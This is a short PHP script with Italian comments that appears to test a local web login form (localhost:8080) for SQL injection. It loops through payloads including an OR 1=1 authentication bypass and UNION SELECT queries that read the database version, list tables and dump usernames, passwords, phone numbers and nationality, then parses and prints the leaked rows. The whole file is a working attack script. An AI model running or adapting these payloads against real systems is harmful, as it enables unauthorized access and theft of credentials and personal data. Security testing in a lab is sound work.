<?php
// sqli_test.php

$target = "http://localhost:8080";

$payloads = [
    "' OR 1=1; --",  // users
    "' UNION SELECT 1,version(),3-- -",
    "' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema = DATABASE()-- -",
    "' UNION SELECT id, username, password FROM users-- -",  // esplicito users
    "' UNION SELECT user_id, telefono, nazionalita FROM profiles-- -",  // profili
];

foreach ($payloads as $payload) {
    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "{$target}?username={$username}&password={$password}";

    echo "\n[+] Testando: {$payload}\n";
    $response = @file_get_contents($url);

    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    // Cerca solo <div class="success">
    if (preg_match_all('/<div class="success">(.*?)<\/div>/is', $response, $matches)) {
        foreach ($matches[1] as $block) {
            $clean = str_replace(['<br>', '<br/>', '<br />'], "\n", $block);
            $decoded = html_entity_decode(strip_tags($clean));
            $lines = array_values(array_filter(array_map('trim', explode("\n", $decoded))));

            // Determina le etichette in base al payload
            if (str_contains($payload, 'profiles')) {
                $labels = ['user_id', 'telefono', 'nazionalità'];
            } elseif (str_contains($payload, 'users')) {
                $labels = ['id', 'username', 'password'];
            } else {
                $labels = ['col1', 'col2', 'col3'];
            }

            // Stampa ogni 3 righe
            for ($i = 0; $i < count($lines); $i += 3) {
                $a = $lines[$i] ?? '';
                $b = $lines[$i + 1] ?? '';
                $c = $lines[$i + 2] ?? '';
                echo "{$labels[0]}: $a | {$labels[1]}: $b | {$labels[2]}: $c\n";
            }
        }
    } else {
        echo "[-] Nessun dato in <div class=\"success\">\n";
    }

    echo "-----------------------------\n";
}
